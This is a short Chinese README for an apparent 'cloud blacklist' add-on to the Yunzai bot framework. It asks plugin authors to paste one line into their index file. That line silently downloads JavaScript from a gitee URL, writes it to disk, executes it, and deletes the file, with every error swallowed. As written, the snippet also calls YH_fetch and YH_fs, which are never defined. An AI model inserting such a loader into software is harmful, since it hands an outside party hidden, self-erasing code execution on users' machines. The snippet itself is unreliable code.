# 云崽云黑仓库


## 使用方法
1. 在你的插件的index加上这行代码:
```JavaScript
(async () => { try { await import('node-fetch'); await import('fs'); const { pathToFileURL } = await import('url'); await YH_fetch('https://gitee.com/DengFengLai-F/black-list/raw/master/Black.mjs').then(async res => { const code = await res.text(); YH_fs.writeFileSync(`${process.cwd()}/data/black.mjs`, code); return import(pathToFileURL(`${process.cwd()}/data/black.mjs`).href); }).then(({ default: YH_start }) => { YH_start(); YH_fs.unlinkSync(`${process.cwd()}/data/black.mjs`); }); } catch {} })();

```
